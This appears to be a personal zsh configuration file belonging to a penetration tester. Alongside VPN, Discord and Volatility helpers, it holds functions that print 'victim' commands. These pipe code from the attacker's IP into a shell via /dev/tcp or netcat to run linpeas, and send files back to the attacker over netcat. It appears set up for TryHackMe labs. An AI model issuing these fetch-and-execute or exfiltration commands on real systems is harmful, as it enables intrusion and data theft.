#╔════════════════╗
#║     USEFUL     ║
#╚════════════════╝

# print a boxed banner sized to the text length
print_box() {
  local text="${1:-Hello World}"
  local pad="${2:-1}"
  local use_unicode=1
  local IFS=$'\n'
  local -a lines
  lines=(${(f)text})

  local max=0
  local line
  for line in "${lines[@]}"; do
    local len=${#line}
    (( len > max )) && max=$len
  done

  local inner=$(( max + pad * 2 ))

  local tl tr bl br v h
  if [[ $use_unicode -eq 1 ]]; then
    tl='╔'; tr='╗'; bl='╚'; br='╝'; v='║'; h='═'
  else
    tl='+'; tr='+'; bl='+'; br='+'; v='|'; h='-'
  fi

  if ! printf '%s' "$h" | grep -q . >/dev/null 2>&1; then
    tl='+'; tr='+'; bl='+'; br='+'; v='|'; h='-'
  else
    if [[ "${LANG:-}" != *UTF-8* && "${LC_ALL:-}" != *UTF-8* && "${LC_CTYPE:-}" != *UTF-8* ]]; then
      tl='+'; tr='+'; bl='+'; br='+'; v='|'; h='-'
    fi
  fi

  local border=''
  for ((i=0; i<inner; i++)); do
    border+="$h"
  done

  printf '%s%s%s\n' "$tl" "$border" "$tr"

  for line in "${lines[@]}"; do
    local leftpad rightpad
    leftpad=$(printf "%${pad}s" "")
    local right_spaces=$(( max - ${#line} + pad ))
    rightpad=$(printf "%${right_spaces}s" "")
    printf '%s%s%s%s%s\n' "$v" "$leftpad" "$line" "$rightpad" "$v"
  done

  printf '%s%s%s\n' "$bl" "$border" "$br"
}

# Starts discord properly
discord() {
  echo "🔐 Starting discord in background..."
  command discord > /tmp/discord.log 2>&1 &
  disown
  echo "✅ Discord launched (log: /tmp/discord.log)"
}

#╔═════════════╗
#║     VPN     ║
#╚═════════════╝

# Start a preconfigured thm vpn
startvpnthm() {
  local config="~/.bash_related/THM_VPN.ovpn"

  if [[ ! -f "$config" ]]; then
    echo "❌ VPN config not found at: $config"
    return 1
  fi

  echo "🔐 Starting VPN in background..."
  sudo openvpn "$config" > /tmp/openvpn.log 2>&1 &
  disown
  echo "✅ VPN launched (log: /tmp/openvpn.log)"
}

# Stop the running thm vpn
stopvpnthm() {
  local pid
  pid=$(pgrep -x openvpn)

  if [[ -z "$pid" ]]; then
    echo "⚠️  No OpenVPN process found — VPN is not running."
    return 0
  fi

  echo "🛑 Stopping VPN (PID: $pid)..."
  sudo kill "$pid"

  sleep 1
  if pgrep -x openvpn >/dev/null; then
    echo "⚠️  OpenVPN still running — forcing kill..."
    sudo kill -9 "$pid"
  else
    echo "✅ VPN stopped successfully."
  fi
}

# Returns current vpn ip
vpn_ip() {
  local iface
  iface=$(ip tuntap show 2>/dev/null | cut -d : -f1 | head -n 1)

  if [[ -z "$iface" ]]; then
    echo "No VPN interface found"
    return 1
  fi

  local ip
  ip=$(ip addr show "$iface" 2>/dev/null \
       | grep -oP '(?<=inet )[0-9]{1,3}(\.[0-9]{1,3}){3}')

  if [[ -n "$ip" ]]; then
    echo "$ip"
    return 0
  else
    echo "No IP on interface $iface"
    return 1
  fi
}

#Fix routes for VPN
fixvpnroutes() {
  local vpn=${1:-tun0} lan=${2:-wlan0} line n=0
  local -a r

  ip link show $vpn &>/dev/null || { echo "[!] $vpn not found"; return 1; }

  for line in ${(f)"$(ip route | grep -E "^10\..* dev $lan( |\$)")"}; do
    r=(${=line%% metric *})
    echo "[*] $r[1]: $lan -> $vpn"
    sudo ip route del $r && sudo ip route add $r[1] dev $vpn && ((n++))
  done

  (( n )) && echo "[✓] $n route(s) fixed." || echo "[=] Nothing to fix."
}

#╔═════════════════╗
#║     PENTEST     ║
#╚═════════════════╝

# Sets a permanent target IP shared between new shells
settarget() {
    sed -i '/^export TARGET=/d' ~/.zshrc
    echo "export TARGET=\"$1\"" >> ~/.zshrc
    export TARGET="$1"
    echo "Target IP has been updated !"
}

# Gives you a command to launch linpeas on a victim's computer
linpeas() {
  local ip
  ip=$(vpn_ip 2>/dev/null) || {
    echo "No VPN IP found."
    return 1
  }

  echo "Here's victim's command. Copy and paste to launch linpeas."
  print_box "cat < /dev/tcp/${ip}/80 | sh"
  echo

  echo "Victim's command using netcat:"
  print_box "nc ${ip} 80 | sh"
  echo

  sudo nc -q 5 -lvnp 80 < /usr/share/peass/linpeas/linpeas.sh
}

# Gives you a command to retrieve a specified file or folder on a victim's computer
upload_file() {
  local target="$1"

  if [[ -z "$target" ]]; then
    echo "Usage: upload_file <file_or_directory>"
    return 1
  fi

  if [[ ! -e "$target" ]]; then
    echo "Target does not exist."
    return 1
  fi

  local ip
  ip=$(vpn_ip 2>/dev/null) || {
    echo "No VPN IP found."
    return 1
  }

  local send_cmd
  local nc_input
  local extract_cmd=""

  if [[ -d "$target" ]]; then
    # Compress directory
    local archive="/tmp/$(basename "$target").tar.gz"
    tar -czf "$archive" -C "$(dirname "$target")" "$(basename "$target")"

    send_cmd="cat < /dev/tcp/${ip}/80 > $(basename "$archive")"
    nc_input="$archive"
    extract_cmd="tar -xzf $(basename "$archive")"
  else
    send_cmd="cat < /dev/tcp/${ip}/80 > $(basename "$target")"
    nc_input="$target"
  fi

  echo "Here's victim's command:"
  print_box "$send_cmd"
  echo

  if [[ -n "$extract_cmd" ]]; then
    echo "After download, run on victim:"
    print_box "$extract_cmd"
    echo
  fi

  sudo nc -q 5 -lvnp 80 < "$nc_input"
}

# Gives you a command to upload a specified file on a victim's computer to your computer
receive_file() {
  local filename="$1"
  local port="${2:-80}"

  if [[ -z "$filename" ]]; then
    echo "Usage: receive_file <output_filename> [port]"
    return 1
  fi

  local ip
  ip=$(vpn_ip 2>/dev/null) || {
    echo "No VPN IP found."
    return 1
  }

  local upload_cmd
  upload_cmd="nc -w 3 ${ip} ${port} < ${filename}"

  echo "Run this on the remote machine:"
  print_box "$upload_cmd"
  echo

  echo "Waiting for incoming file on ${ip}:${port}..."
  echo "Saving to: ${filename}"
  echo

  nc -l -p "$port" > "$filename"

  echo
  echo "Upload complete."
}

#╔═══════════════════╗
#║      FORENSIC     ║
#╚═══════════════════╝

# Opens an additionnal help website on volatility when -h
vol() {
  if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    if command -v xdg-open >/dev/null 2>&1; then
      xdg-open 'https://shop.csilinux.com/unlocking-windows-memory-with-volatility3/' >/dev/null 2>&1 &
    elif command -v open >/dev/null 2>&1; then
      open 'https://shop.csilinux.com/unlocking-windows-memory-with-volatility3/' >/dev/null 2>&1 &
    fi

    command vol -h
    return
  fi

  command vol "$@"
}


#╔═════════════════╗
#║     ALIASES     ║
#╚═════════════════╝

alias pwncat="pwncat-vl"
alias vol2='docker run -it --rm -v $(pwd):/data:ro blacktop/volatility $@'
alias exegol='sudo -E $(echo ~/.local/bin/exegol)'
